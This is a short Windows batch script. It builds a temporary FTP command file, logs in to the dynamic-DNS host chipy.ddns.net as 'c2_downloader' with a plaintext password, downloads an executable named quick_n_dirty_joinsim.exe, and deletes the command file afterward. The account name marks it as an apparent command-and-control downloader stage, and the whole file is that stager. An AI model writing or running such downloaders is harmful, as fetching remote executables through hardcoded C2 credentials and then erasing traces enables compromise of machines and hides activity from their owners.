@echo off

REM Generate the script. Will overwrite any existing temp.txt
echo open chipy.ddns.net> temp.txt
echo c2_downloader>> temp.txt
echo alpha>> temp.txt
echo get quick_n_dirty_joinsim.exe>> temp.txt
echo quit>> temp.txt

REM Launch FTP and pass it the script
ftp -s:temp.txt

REM Clean up.
del temp.txt
